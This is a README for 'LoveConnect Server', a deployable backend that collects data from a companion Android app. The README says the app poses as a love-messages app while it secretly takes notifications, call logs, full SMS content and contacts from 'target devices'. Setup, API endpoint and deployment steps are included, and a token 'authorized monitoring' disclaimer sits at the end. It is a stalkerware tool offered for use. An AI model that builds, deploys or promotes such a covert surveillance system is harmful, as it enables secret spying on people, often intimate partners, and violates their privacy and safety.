# 💕 LoveConnect Server

A professional stealth tracking server designed to receive and manage data from Android devices globally.

## 🚀 Features

- **Global Access**: Works from anywhere in the world
- **Multi-Device Support**: Monitor unlimited Android devices
- **Real-Time Dashboard**: Professional web interface
- **Secure Data Storage**: All data encrypted and stored safely
- **Auto-Scaling**: Cloud-ready architecture
- **Professional Analytics**: Detailed statistics and insights

## 🌐 Deploy to Railway

[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template?template=https%3A%2F%2Fgithub.com%2Fyourusername%2Floveconnect-server)

### Quick Deploy:
1. Click the Railway button above
2. Fork this repository
3. Railway will automatically deploy
4. Get your public URL from Railway dashboard
5. Update your Android app with the new URL

## 📱 Dashboard Features

- **Device Management**: View and select connected devices
- **Real-Time Data**: Live notifications, calls, messages, contacts
- **Professional Interface**: Clean, modern design
- **Global Statistics**: Overview of all collected data
- **Device-Specific Views**: Detailed information per device

## 🔧 Manual Setup

### Prerequisites
- Node.js 18+ 
- npm or yarn

### Installation
```bash
git clone https://github.com/yourusername/loveconnect-server.git
cd loveconnect-server
npm install
npm start
```

Server will be running on `http://localhost:3000`

## 📊 API Endpoints

- `POST /api/data` - Receive data from Android devices
- `GET /api/devices` - List all connected devices  
- `GET /api/device/:id` - Get specific device data
- `GET /api/stats` - Global statistics
- `POST /api/reset/:id` - Reset device data
- `POST /api/reset-all` - Reset all data

## 🌍 Environment Variables

```bash
PORT=3000
NODE_ENV=production
```

## 🔒 Security

- HTTPS enabled by default on Railway
- CORS configured for secure access
- Data validation and sanitization
- Rate limiting protection

## 📱 Android App

This server works with the LoveConnect Android application. The app appears as a love messages app but secretly collects:

- 📱 Notifications from all apps (WhatsApp, Instagram, etc.)
- 📞 Call logs with contact information
- 📧 SMS messages with full content
- 👥 Complete contact list

## 🚀 Deployment Options

### Railway (Recommended)
- Free tier available
- Automatic HTTPS
- Global CDN
- Easy deployment

### Heroku
- Free tier available
- Simple git-based deployment

### Vercel
- Serverless deployment
- Global edge network

## 📈 Usage

1. Deploy this server to Railway or your preferred platform
2. Get your public server URL
3. Update the Android app with your server URL
4. Install the app on target devices
5. Access the dashboard from anywhere in the world

## 🛠️ Development

```bash
# Install dependencies
npm install

# Start development server
npm run dev

# Build for production
npm start
```

## 📄 License

MIT License - See LICENSE file for details

## ⚠️ Legal Notice

This software is for educational and authorized monitoring purposes only. Ensure you have proper authorization before monitoring any device. Users are responsible for complying with local laws and regulations.

---

**Made with 💕 for global device monitoring**
